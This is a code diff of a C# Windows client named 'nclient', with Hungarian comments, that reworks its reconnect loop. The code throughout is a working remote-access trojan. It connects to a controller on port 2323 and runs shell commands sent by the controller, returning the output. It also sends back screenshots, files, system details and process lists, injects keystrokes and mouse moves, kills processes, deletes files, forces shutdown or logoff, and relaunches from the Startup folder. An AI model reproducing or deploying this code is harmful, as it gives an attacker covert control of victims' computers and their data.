@@ -225,530 +225,534 @@ namespace nclient
         {
             string command = "";
             string text = "";
-        elorol://megpróbál ujra csatlakozni
-            try
+        //megpróbál ujra csatlakozni
+            while (true)
             {
-
-
-                TcpClient client = new TcpClient(subcontroller, 2323);
-                NetworkStream stream = client.GetStream();
-                Console.WriteLine($"connected to {subcontroller}:2323");
-
-                while (true)
+                try
                 {
-                    //Console.WriteLine("breki");
-                    byte[] buffer = new byte[1024];
-                    int bytes = await stream.ReadAsync(buffer, 0, buffer.Length);
-                    text = Encoding.UTF8.GetString(buffer, 0, bytes);//itt kapja meg az üzeneteket
-                    //Console.WriteLine(msg);
-                    if (!string.IsNullOrEmpty(text))
+
+
+                    TcpClient client = new TcpClient();
+                    await client.ConnectAsync(subcontroller, 2323);
+                    NetworkStream stream = client.GetStream();
+                    Console.WriteLine($"connected to {subcontroller}:2323");
+
+                    while (true)
                     {
-
-                        switch (command)
+                        //Console.WriteLine("breki");
+                        byte[] buffer = new byte[1024];
+                        int bytes = await stream.ReadAsync(buffer, 0, buffer.Length);
+                        text = Encoding.UTF8.GetString(buffer, 0, bytes);//itt kapja meg az üzeneteket
+                                                                         //Console.WriteLine(msg);
+                        if (!string.IsNullOrEmpty(text))
                         {
-                            case "kys":
-                                Environment.Exit(0);
-                                break;
-                            case "setwallpaper":
-                                try
-                                {
-                                    text = PathReplace(text);
-                                    SetWallpaper(text);
-                                }
-                                catch (Exception e)
-                                {
-                                    command = "";
-                                    Console.WriteLine(e);
-                                }
-                                command = "";
-                                continue;
-                            case "msgbox":
-                                command = "";
-                                File.WriteAllText(dataPath + "\\emesgebox.vbs", $"msgbox \"{text}\"");
-                                Process.Start(dataPath + "\\emesgebox.vbs");
-                                Console.WriteLine("emesgebox elinditvaxd");
-                                continue;
-                            case "mousex":
-                                command = "";
-                                try
-                                {
-                                    var pos = System.Windows.Forms.Cursor.Position;
-                                    int mennyit = Convert.ToInt32(text);
-                                    SetCursorPos(pos.X + mennyit, pos.Y);
-                                }
-                                catch (Exception e)
-                                {
-                                    Console.WriteLine(e);
-                                }
-                                continue;
 
-                            case "mousey":
-                                command = "";
-                                try
-                                {
-                                    var pos = System.Windows.Forms.Cursor.Position;
-                                    int mennyit = Convert.ToInt32(text);
-                                    SetCursorPos(pos.X, pos.Y + mennyit);
-                                }
-                                catch (Exception e)
-                                {
-                                    Console.WriteLine(e);
-                                }
-                                continue;
-                            case "keystroke":
-                                command = "";
-                                SendKeys.SendWait(text);
-                                continue;
-                            case "kill":
-                                command = "";
-                                foreach (var process in Process.GetProcessesByName(text.Trim())) process.Kill();
-                                continue;
-                            case "delete":
-                                command = "";
-                                try
-                                {
-                                    text = PathReplace(text); try
+                            switch (command)
+                            {
+                                case "kys":
+                                    Environment.Exit(0);
+                                    break;
+                                case "setwallpaper":
+                                    try
                                     {
-                                        File.Delete(text);
+                                        text = PathReplace(text);
+                                        SetWallpaper(text);
+                                    }
+                                    catch (Exception e)
+                                    {
+                                        command = "";
+                                        Console.WriteLine(e);
+                                    }
+                                    command = "";
+                                    continue;
+                                case "msgbox":
+                                    command = "";
+                                    File.WriteAllText(dataPath + "\\emesgebox.vbs", $"msgbox \"{text}\"");
+                                    Process.Start(dataPath + "\\emesgebox.vbs");
+                                    Console.WriteLine("emesgebox elinditvaxd");
+                                    continue;
+                                case "mousex":
+                                    command = "";
+                                    try
+                                    {
+                                        var pos = System.Windows.Forms.Cursor.Position;
+                                        int mennyit = Convert.ToInt32(text);
+                                        SetCursorPos(pos.X + mennyit, pos.Y);
                                     }
                                     catch (Exception e)
                                     {
                                         Console.WriteLine(e);
                                     }
-                                }
-                                catch (Exception e)
-                                {
-                                    Console.WriteLine(e);
-                                }
-                                continue;
-                            case "processS":
-                                command = "";
-                                try
-                                {
-                                    text = PathReplace(text);
-                                    Process.Start(text);
-                                }
-                                catch (Exception e)
-                                {
+                                    continue;
+
+                                case "mousey":
                                     command = "";
-                                    Console.WriteLine(e);
-                                }
-                                continue;
-                            case "logoff":
-                                command = "";
-                                Console.WriteLine(text);
-                                try
-                                {
-                                    ExitWindowsEx(0, 0);
-                                    MessageBox.Show("kilogoffolt a géped báttya");
-                                }
-                                catch (Exception e)
-                                {
-                                    command = "";
-                                    Console.WriteLine(e);
-                                }
-                                break;
-                            case "shutdown":
-                                command = "";
-                                Console.WriteLine(text);
-                                try
-                                {
-                                    Process.Start("shutdown.exe", "-s -t 00");
-                                }
-                                catch (Exception e)
-                                {
-                                    command = "";
-                                    Console.WriteLine(e);
-                                }
-                                break;
-                            case "restart":
-                                command = "";
-                                Console.WriteLine(text);
-                                try
-                                {
-                                    Process.Start("shutdown.exe", "-r -t 00");
-                                }
-                                catch (Exception e)
-                                {
-                                    command = "";
-                                    Console.WriteLine(e);
-                                }
-                                break;
-
-                            case "update":
-                                command = "";
-                                isBeingUpdated = true;
-                                Console.WriteLine(text);
-                                break;
-
-                            case "getres":
-                                command = "";
-                                Send("meleg vagy", stream);
-                                break;
-
-
-                            //fetches
-                            case "fsi":
-
-                                var computer = new ComputerInfo();
-                                Process cmdprocess = new Process();
-
-                                ProcessStartInfo psi = new ProcessStartInfo();
-                                psi.FileName = "cmd.exe";
-                                psi.Arguments = "/c whoami";  // /c = futtatja, majd bezárja a cmd-t
-                                psi.RedirectStandardOutput = true; // ide fogja irányítani a kimenetet
-                                psi.RedirectStandardError = true;  // hibaüzeneteket is lekérheted
-                                psi.UseShellExecute = false;       // kötelező a redirekcióhoz
-                                psi.CreateNoWindow = true;         // ne nyisson új ablakot
-                                cmdprocess.StartInfo = psi;
-                                cmdprocess.Start();
-                                cmdprocess.WaitForExit();
-                                string output = cmdprocess.StandardOutput.ReadToEnd();
-                                string errors = cmdprocess.StandardError.ReadToEnd();
-
-                                string wininfo = $"{computer.OSFullName} ({computer.OSPlatform}) {computer.OSVersion}";
-                                Console.WriteLine(wininfo);
-                                string whoami = output.Trim();
-
-                                ulong total = computer.TotalPhysicalMemory;
-                                ulong available = computer.AvailablePhysicalMemory;
-                                string usedMb = $"{ (total - available) / 1024 / 1024 }";
-                                string totalMb = $"{total / 1024 / 1024}";
-                                Console.WriteLine(usedMb);
-                                Console.WriteLine(totalMb);
-                                var cpu = new PerformanceCounter("Processor", "% Processor Time", "_Total");
-                                cpu.NextValue();
-
-                                Thread.Sleep(800);
-                                string cpuszazalek = $"{cpu.NextValue()}";
-                                Console.WriteLine(cpuszazalek);
-
-
-
-                                string hostName = System.Net.Dns.GetHostName();
-
-
-
-
-                                ManagementObjectSearcher objvida = new ManagementObjectSearcher("select * from Win32_VideoController ");
-
-                                string VC = String.Empty;
-
-                                string DI = String.Empty;
-
-                                foreach (ManagementObject objaj in objvida.Get())
-
-                                {
-
-                                    if (objaj["CurrentBitsPerPixel"] != null && objaj["CurrentHorizontalResolution"] != null)
+                                    try
                                     {
-
-                                        if ((String)objaj["DeviceID"] == "VideoController2")
-
-                                        {
-
-                                            DI = objaj["DeviceID"].ToString();
-
-                                            VC = objaj["Description"].ToString();
-
-                                            Console.WriteLine(DI);
-
-                                            Console.WriteLine(VC);
-
-                                        }
-
+                                        var pos = System.Windows.Forms.Cursor.Position;
+                                        int mennyit = Convert.ToInt32(text);
+                                        SetCursorPos(pos.X, pos.Y + mennyit);
                                     }
+                                    catch (Exception e)
+                                    {
+                                        Console.WriteLine(e);
+                                    }
+                                    continue;
+                                case "keystroke":
+                                    command = "";
+                                    SendKeys.SendWait(text);
+                                    continue;
+                                case "kill":
+                                    command = "";
+                                    foreach (var process in Process.GetProcessesByName(text.Trim())) process.Kill();
+                                    continue;
+                                case "delete":
+                                    command = "";
+                                    try
+                                    {
+                                        text = PathReplace(text); try
+                                        {
+                                            File.Delete(text);
+                                        }
+                                        catch (Exception e)
+                                        {
+                                            Console.WriteLine(e);
+                                        }
+                                    }
+                                    catch (Exception e)
+                                    {
+                                        Console.WriteLine(e);
+                                    }
+                                    continue;
+                                case "processS":
+                                    command = "";
+                                    try
+                                    {
+                                        text = PathReplace(text);
+                                        Process.Start(text);
+                                    }
+                                    catch (Exception e)
+                                    {
+                                        command = "";
+                                        Console.WriteLine(e);
+                                    }
+                                    continue;
+                                case "logoff":
+                                    command = "";
+                                    Console.WriteLine(text);
+                                    try
+                                    {
+                                        ExitWindowsEx(0, 0);
+                                        MessageBox.Show("kilogoffolt a géped báttya");
+                                    }
+                                    catch (Exception e)
+                                    {
+                                        command = "";
+                                        Console.WriteLine(e);
+                                    }
+                                    break;
+                                case "shutdown":
+                                    command = "";
+                                    Console.WriteLine(text);
+                                    try
+                                    {
+                                        Process.Start("shutdown.exe", "-s -t 00");
+                                    }
+                                    catch (Exception e)
+                                    {
+                                        command = "";
+                                        Console.WriteLine(e);
+                                    }
+                                    break;
+                                case "restart":
+                                    command = "";
+                                    Console.WriteLine(text);
+                                    try
+                                    {
+                                        Process.Start("shutdown.exe", "-r -t 00");
+                                    }
+                                    catch (Exception e)
+                                    {
+                                        command = "";
+                                        Console.WriteLine(e);
+                                    }
+                                    break;
 
-                                }
+                                case "update":
+                                    command = "";
+                                    isBeingUpdated = true;
+                                    Console.WriteLine(text);
+                                    break;
+
+                                case "getres":
+                                    command = "";
+                                    Send("meleg vagy", stream);
+                                    break;
 
 
-                                string adatok = $"sysinfo|{wininfo}|{whoami}|{usedMb}|{totalMb}|{cpuszazalek}|{hostName}|{DI}\n{VC}|";
-                                //sysinfo|wininfo|whoami|usedMB|totalMB|cpu|hostname|videokartyainfok|
+                                //fetches
+                                case "fsi":
 
-                                Console.WriteLine(adatok);
-                                //Console.WriteLine("nyomjleegygombot");
-                                //Console.ReadKey();
-                                //Send(adatok, stream);
+                                    var computer = new ComputerInfo();
+                                    Process cmdprocess = new Process();
 
-                                //Console.ReadKey();
-                                Send(adatok, stream);
-
-
-
-                                Console.WriteLine("elkudlte elvilegxd");
-                                //Console.ReadKey();
-                                command = "";
-                                continue;
-                            case "frp":
-                                command = "";
-                                string runningProcesses = @"rp|";
-
-                                Process[] rProcesses = Process.GetProcesses();
-
-                                rProcesses.OrderBy(x => x.ProcessName);
-                                foreach (Process i in rProcesses)
-                                {
-                                    runningProcesses += $"{i.ProcessName}\n";
-                                }
-                                Send(runningProcesses, stream);
-                                continue;
-                            case "fsc":
-                                command = "";
-                                Screen[] screens = Screen.AllScreens;
-                                string returner = $"screens|{screens.Length}|";
-                                foreach (Screen item in screens) returner += $"{item.DeviceName}|{item.Primary}|{item.Bounds.Width}|{item.Bounds.Height}|";
-                                Send(returner, stream);
-                                continue;
-                            case "screenshot":
-                                command = "";
-                                TakeScreenshot();
-                                Console.WriteLine("screenshot megvan");
-                                SendFile(screenshotPath, "melegvagy", client);
-                                Console.WriteLine("elv vége a sendfilenak, idk megjött e, mingy kiderül");
-                                continue;
-                            case "cmd":
-                                command = "";
-                                string texted = "";
-                                try
-                                {
-                                    // Parancs
-
-                                    // Folyamat beállítása
-                                    psi = new ProcessStartInfo();
+                                    ProcessStartInfo psi = new ProcessStartInfo();
                                     psi.FileName = "cmd.exe";
-                                    psi.Arguments = "/c " + text;  // /c = futtatja, majd bezárja a cmd-t
+                                    psi.Arguments = "/c whoami";  // /c = futtatja, majd bezárja a cmd-t
                                     psi.RedirectStandardOutput = true; // ide fogja irányítani a kimenetet
                                     psi.RedirectStandardError = true;  // hibaüzeneteket is lekérheted
                                     psi.UseShellExecute = false;       // kötelező a redirekcióhoz
                                     psi.CreateNoWindow = true;         // ne nyisson új ablakot
+                                    cmdprocess.StartInfo = psi;
+                                    cmdprocess.Start();
+                                    cmdprocess.WaitForExit();
+                                    string output = cmdprocess.StandardOutput.ReadToEnd();
+                                    string errors = cmdprocess.StandardError.ReadToEnd();
 
-                                    // Folyamat indítása
-                                    using (Process process = Process.Start(psi))
+                                    string wininfo = $"{computer.OSFullName} ({computer.OSPlatform}) {computer.OSVersion}";
+                                    Console.WriteLine(wininfo);
+                                    string whoami = output.Trim();
+
+                                    ulong total = computer.TotalPhysicalMemory;
+                                    ulong available = computer.AvailablePhysicalMemory;
+                                    string usedMb = $"{ (total - available) / 1024 / 1024 }";
+                                    string totalMb = $"{total / 1024 / 1024}";
+                                    Console.WriteLine(usedMb);
+                                    Console.WriteLine(totalMb);
+                                    var cpu = new PerformanceCounter("Processor", "% Processor Time", "_Total");
+                                    cpu.NextValue();
+
+                                    Thread.Sleep(800);
+                                    string cpuszazalek = $"{cpu.NextValue()}";
+                                    Console.WriteLine(cpuszazalek);
+
+
+
+                                    string hostName = System.Net.Dns.GetHostName();
+
+
+
+
+                                    ManagementObjectSearcher objvida = new ManagementObjectSearcher("select * from Win32_VideoController ");
+
+                                    string VC = String.Empty;
+
+                                    string DI = String.Empty;
+
+                                    foreach (ManagementObject objaj in objvida.Get())
+
                                     {
-                                        // Kimenet beolvasása
-                                        output = process.StandardOutput.ReadToEnd();
-                                        errors = process.StandardError.ReadToEnd();
 
-                                        process.WaitForExit(); // megvárjuk, amíg lefut
-                                        Console.WriteLine(output);
-                                        texted = output;
-
-                                        if (!string.IsNullOrEmpty(errors))
+                                        if (objaj["CurrentBitsPerPixel"] != null && objaj["CurrentHorizontalResolution"] != null)
                                         {
-                                            texted = errors;
+
+                                            if ((String)objaj["DeviceID"] == "VideoController2")
+
+                                            {
+
+                                                DI = objaj["DeviceID"].ToString();
+
+                                                VC = objaj["Description"].ToString();
+
+                                                Console.WriteLine(DI);
+
+                                                Console.WriteLine(VC);
+
+                                            }
+
+                                        }
+
+                                    }
+
+
+                                    string adatok = $"sysinfo|{wininfo}|{whoami}|{usedMb}|{totalMb}|{cpuszazalek}|{hostName}|{DI}\n{VC}|";
+                                    //sysinfo|wininfo|whoami|usedMB|totalMB|cpu|hostname|videokartyainfok|
+
+                                    Console.WriteLine(adatok);
+                                    //Console.WriteLine("nyomjleegygombot");
+                                    //Console.ReadKey();
+                                    //Send(adatok, stream);
+
+                                    //Console.ReadKey();
+                                    Send(adatok, stream);
+
+
+
+                                    Console.WriteLine("elkudlte elvilegxd");
+                                    //Console.ReadKey();
+                                    command = "";
+                                    continue;
+                                case "frp":
+                                    command = "";
+                                    string runningProcesses = @"rp|";
+
+                                    Process[] rProcesses = Process.GetProcesses();
+
+                                    rProcesses.OrderBy(x => x.ProcessName);
+                                    foreach (Process i in rProcesses)
+                                    {
+                                        runningProcesses += $"{i.ProcessName}\n";
+                                    }
+                                    Send(runningProcesses, stream);
+                                    continue;
+                                case "fsc":
+                                    command = "";
+                                    Screen[] screens = Screen.AllScreens;
+                                    string returner = $"screens|{screens.Length}|";
+                                    foreach (Screen item in screens) returner += $"{item.DeviceName}|{item.Primary}|{item.Bounds.Width}|{item.Bounds.Height}|";
+                                    Send(returner, stream);
+                                    continue;
+                                case "screenshot":
+                                    command = "";
+                                    TakeScreenshot();
+                                    Console.WriteLine("screenshot megvan");
+                                    SendFile(screenshotPath, "melegvagy", client);
+                                    Console.WriteLine("elv vége a sendfilenak, idk megjött e, mingy kiderül");
+                                    continue;
+                                case "cmd":
+                                    command = "";
+                                    string texted = "";
+                                    try
+                                    {
+                                        // Parancs
+
+                                        // Folyamat beállítása
+                                        psi = new ProcessStartInfo();
+                                        psi.FileName = "cmd.exe";
+                                        psi.Arguments = "/c " + text;  // /c = futtatja, majd bezárja a cmd-t
+                                        psi.RedirectStandardOutput = true; // ide fogja irányítani a kimenetet
+                                        psi.RedirectStandardError = true;  // hibaüzeneteket is lekérheted
+                                        psi.UseShellExecute = false;       // kötelező a redirekcióhoz
+                                        psi.CreateNoWindow = true;         // ne nyisson új ablakot
+
+                                        // Folyamat indítása
+                                        using (Process process = Process.Start(psi))
+                                        {
+                                            // Kimenet beolvasása
+                                            output = process.StandardOutput.ReadToEnd();
+                                            errors = process.StandardError.ReadToEnd();
+
+                                            process.WaitForExit(); // megvárjuk, amíg lefut
+                                            Console.WriteLine(output);
+                                            texted = output;
+
+                                            if (!string.IsNullOrEmpty(errors))
+                                            {
+                                                texted = errors;
+                                            }
                                         }
                                     }
-                                }
-                                catch (Exception)
-                                {
-                                    Console.WriteLine("idk");
-                                }
-                                Send($"cmd|{localIP}|{texted}", stream);
-
-
-                                break;
-
-
-                            //fajlkezeles
-                            case "cd":
-                                command = "";
-                                returner = "";
-                                try
-                                {
-                                    if (text == "..")
+                                    catch (Exception)
                                     {
-                                        Directory.SetCurrentDirectory(Directory.GetParent(Directory.GetCurrentDirectory()).ToString());
+                                        Console.WriteLine("idk");
                                     }
-                                    else
-                                    {
-                                        text = PathReplace(text);
-                                        Directory.SetCurrentDirectory(text);
-                                    }
-                                }
-                                catch (Exception e)
-                                {
-                                    returner = $"cd|{e}";
-                                }
-                                Send(returner, stream);
-                                break;
-                            case "cd..":
+                                    Send($"cmd|{localIP}|{texted}", stream);
 
-                                command = "";
-                                returner = "";
-                                try
-                                {
-                                    Directory.SetCurrentDirectory(Directory.GetParent(Directory.GetCurrentDirectory()).ToString());
-                                }
-                                catch (Exception e)
-                                {
-                                    returner = e.ToString();
-                                }
-                                Send(returner, stream);
-                                break;
-                            case "ls":
-                                command = "";
-                                returner = $"ls|";
-                                List<string> cuccokAKonyvtarban = new List<string>();
-                                try
-                                {
-                                    Directory.GetFileSystemEntries(Directory.GetCurrentDirectory()).ToList().ForEach(a => cuccokAKonyvtarban.Add($"{a}"));
-                                    for (int i = 0; i < cuccokAKonyvtarban.Count(); i++)
+
+                                    break;
+
+
+                                //fajlkezeles
+                                case "cd":
+                                    command = "";
+                                    returner = "";
+                                    try
                                     {
-                                        bool mappa = (File.GetAttributes(cuccokAKonyvtarban[i]) & FileAttributes.Directory) == FileAttributes.Directory;
-                                        if (mappa)
+                                        if (text == "..")
                                         {
-                                            cuccokAKonyvtarban[i] += "?mappa";
-                                        }
-                                        else cuccokAKonyvtarban[i] += "?fajl";
-                                    }
-                                    foreach (string item in cuccokAKonyvtarban)
-                                    {
-                                        Console.WriteLine(item);
-                                    }
-                                }
-                                catch (Exception e)
-                                {
-                                    cuccokAKonyvtarban.Add(e.ToString());
-                                }
-                                foreach (string a in cuccokAKonyvtarban)
-                                {
-                                    returner += $"{a}\n";
-                                }
-                                Send(returner, stream);
-                                break;
-                            case "pwd":
-                                command = "";
-                                Send($"pwd|{Directory.GetCurrentDirectory()}", stream);
-                                Thread.Sleep(200);
-                                break;
-                            case "download":
-                                command = "";
-                                if (File.Exists(text)) SendFile(text, "melegvagy", client);
-                                else
-                                {
-                                    Send("download", stream);
-                                }
-                                break;
-
-
-
-
-
-
-                            case "audio":
-                                command = "";
-                                try
-                                {
-                                    // MMDeviceEnumerator létrehozása
-                                    var enumerator = new MMDeviceEnumerator() as IMMDeviceEnumerator;
-
-                                    // Alapértelmezett kimeneti eszköz
-                                    enumerator.GetDefaultAudioEndpoint(EDataFlow.eRender, ERole.eMultimedia, out IMMDevice device);
-
-                                    // IAudioEndpointVolume lekérése
-                                    Guid iid = typeof(IAudioEndpointVolume).GUID;
-                                    device.Activate(ref iid, CLSCTX.ALL, IntPtr.Zero, out object obj);
-
-                                    var volume = (IAudioEndpointVolume)obj;
-
-                                    // 🔊 50% hangerő
-                                    volume.SetMasterVolumeLevelScalar((float)(Convert.ToDouble(text) / 100.0), Guid.Empty);
-                                }
-                                catch (Exception)
-                                {
-                                    Send("audio|nem jó érték audióra", stream);
-                                }
-
-                                break;
-
-
-                            case "subcontroller":
-                                command = "";
-
-                                string[] darabolva = text.Split(' ');
-                                switch (darabolva[0])
-                                {
-                                    case "add":
-                                        File.AppendAllLines(Path.Combine(workPath, "subcontrollers.txt"), new string[] { darabolva[1] });
-                                        _ = ListenToCommands(darabolva[1]);
-                                        break;
-                                    case "remove":
-
-                                        var file = Path.Combine(workPath, "subcontrollers.txt");
-                                        var ipToRemove = darabolva[1]?.Trim();
-
-                                        if (File.Exists(file) && !string.IsNullOrWhiteSpace(ipToRemove))
-                                        {
-                                            var lines = File.ReadAllLines(file)
-                                                .Select(l => l.Trim())
-                                                .Where(l => !string.IsNullOrWhiteSpace(l))   // üres sorok kuka
-                                                .Where(l => l != ipToRemove)                // törlendő IP kuka
-                                                .Distinct()                                 // opcionális duplikátum szűrés
-                                                .ToArray();
-
-                                            File.WriteAllLines(file, lines);
-                                        }
-                                        break;
-                                    case "list":
-                                        if (File.Exists(Path.Combine(workPath, "subcontrollers.txt")))
-                                        {
-                                            Send($"subcontrollerlist|{File.ReadAllText(Path.Combine(workPath, "subcontrollers.txt"))}", stream);
+                                            Directory.SetCurrentDirectory(Directory.GetParent(Directory.GetCurrentDirectory()).ToString());
                                         }
                                         else
                                         {
-                                            Send($"subcontrollerlist|[$Nincsen subcontroller fajl még$]", stream);
+                                            text = PathReplace(text);
+                                            Directory.SetCurrentDirectory(text);
                                         }
-                                        
-                                        break;
-                                    default:
-                                        break;
-                                }
+                                    }
+                                    catch (Exception e)
+                                    {
+                                        returner = $"cd|{e}";
+                                    }
+                                    Send(returner, stream);
+                                    break;
+                                case "cd..":
 
-                                break;
-                            case "reload":
-                                command = "";
-                                var psis = new ProcessStartInfo
-                                {
-                                    FileName = Path.Combine(
-                                    Environment.GetFolderPath(Environment.SpecialFolder.Startup),
-                                    "nclient.exe"
-                                ),
-                                    UseShellExecute = true
-                                };
+                                    command = "";
+                                    returner = "";
+                                    try
+                                    {
+                                        Directory.SetCurrentDirectory(Directory.GetParent(Directory.GetCurrentDirectory()).ToString());
+                                    }
+                                    catch (Exception e)
+                                    {
+                                        returner = e.ToString();
+                                    }
+                                    Send(returner, stream);
+                                    break;
+                                case "ls":
+                                    command = "";
+                                    returner = $"ls|";
+                                    List<string> cuccokAKonyvtarban = new List<string>();
+                                    try
+                                    {
+                                        Directory.GetFileSystemEntries(Directory.GetCurrentDirectory()).ToList().ForEach(a => cuccokAKonyvtarban.Add($"{a}"));
+                                        for (int i = 0; i < cuccokAKonyvtarban.Count(); i++)
+                                        {
+                                            bool mappa = (File.GetAttributes(cuccokAKonyvtarban[i]) & FileAttributes.Directory) == FileAttributes.Directory;
+                                            if (mappa)
+                                            {
+                                                cuccokAKonyvtarban[i] += "?mappa";
+                                            }
+                                            else cuccokAKonyvtarban[i] += "?fajl";
+                                        }
+                                        foreach (string item in cuccokAKonyvtarban)
+                                        {
+                                            Console.WriteLine(item);
+                                        }
+                                    }
+                                    catch (Exception e)
+                                    {
+                                        cuccokAKonyvtarban.Add(e.ToString());
+                                    }
+                                    foreach (string a in cuccokAKonyvtarban)
+                                    {
+                                        returner += $"{a}\n";
+                                    }
+                                    Send(returner, stream);
+                                    break;
+                                case "pwd":
+                                    command = "";
+                                    Send($"pwd|{Directory.GetCurrentDirectory()}", stream);
+                                    Thread.Sleep(200);
+                                    break;
+                                case "download":
+                                    command = "";
+                                    if (File.Exists(text)) SendFile(text, "melegvagy", client);
+                                    else
+                                    {
+                                        Send("download", stream);
+                                    }
+                                    break;
 
-                                Process.Start(psis);
-                                Environment.Exit(0);
-                                break;
 
 
-                            case "file|":
-                                Console.WriteLine("ezt jo tudni hogy jo minden, bejott a file-ba");
-                                GetFile(stream, text);
-                                command = "";
 
 
-                                continue;
-                            default:
 
-                                command = text;
-                                continue;
+                                case "audio":
+                                    command = "";
+                                    try
+                                    {
+                                        // MMDeviceEnumerator létrehozása
+                                        var enumerator = new MMDeviceEnumerator() as IMMDeviceEnumerator;
+
+                                        // Alapértelmezett kimeneti eszköz
+                                        enumerator.GetDefaultAudioEndpoint(EDataFlow.eRender, ERole.eMultimedia, out IMMDevice device);
+
+                                        // IAudioEndpointVolume lekérése
+                                        Guid iid = typeof(IAudioEndpointVolume).GUID;
+                                        device.Activate(ref iid, CLSCTX.ALL, IntPtr.Zero, out object obj);
+
+                                        var volume = (IAudioEndpointVolume)obj;
+
+                                        // 🔊 50% hangerő
+                                        volume.SetMasterVolumeLevelScalar((float)(Convert.ToDouble(text) / 100.0), Guid.Empty);
+                                    }
+                                    catch (Exception)
+                                    {
+                                        Send("audio|nem jó érték audióra", stream);
+                                    }
+
+                                    break;
+
+
+                                case "subcontroller":
+                                    command = "";
+
+                                    string[] darabolva = text.Split(' ');
+                                    switch (darabolva[0])
+                                    {
+                                        case "add":
+                                            File.AppendAllLines(Path.Combine(workPath, "subcontrollers.txt"), new string[] { darabolva[1] });
+                                            _ = ListenToCommands(darabolva[1]);
+                                            break;
+                                        case "remove":
+
+                                            var file = Path.Combine(workPath, "subcontrollers.txt");
+                                            var ipToRemove = darabolva[1]?.Trim();
+
+                                            if (File.Exists(file) && !string.IsNullOrWhiteSpace(ipToRemove))
+                                            {
+                                                var lines = File.ReadAllLines(file)
+                                                    .Select(l => l.Trim())
+                                                    .Where(l => !string.IsNullOrWhiteSpace(l))   // üres sorok kuka
+                                                    .Where(l => l != ipToRemove)                // törlendő IP kuka
+                                                    .Distinct()                                 // opcionális duplikátum szűrés
+                                                    .ToArray();
+
+                                                File.WriteAllLines(file, lines);
+                                            }
+                                            break;
+                                        case "list":
+                                            if (File.Exists(Path.Combine(workPath, "subcontrollers.txt")))
+                                            {
+                                                Send($"subcontrollerlist|{File.ReadAllText(Path.Combine(workPath, "subcontrollers.txt"))}", stream);
+                                            }
+                                            else
+                                            {
+                                                Send($"subcontrollerlist|[$Nincsen subcontroller fajl még$]", stream);
+                                            }
+
+                                            break;
+                                        default:
+                                            break;
+                                    }
+
+                                    break;
+                                case "reload":
+                                    command = "";
+                                    var psis = new ProcessStartInfo
+                                    {
+                                        FileName = Path.Combine(
+                                        Environment.GetFolderPath(Environment.SpecialFolder.Startup),
+                                        "nclient.exe"
+                                    ),
+                                        UseShellExecute = true
+                                    };
+
+                                    Process.Start(psis);
+                                    Environment.Exit(0);
+                                    break;
+
+
+                                case "file|":
+                                    Console.WriteLine("ezt jo tudni hogy jo minden, bejott a file-ba");
+                                    GetFile(stream, text);
+                                    command = "";
+
+
+                                    continue;
+                                default:
+
+                                    command = text;
+                                    continue;
+                            }
+
                         }
+                        command = text;
+
+                        Console.WriteLine(text);
+
+
 
                     }
-                    command = text;
-
-                    Console.WriteLine(text);
-
-
-
                 }
-            }
-            catch (Exception e)
-            {
-                Console.WriteLine(e.ToString());
-                goto elorol;
-            }
+                catch (Exception e)
+                {
+                    Console.WriteLine(e.ToString());
+                    //goto elorol;
+                }
 
+            }
 
         }
 
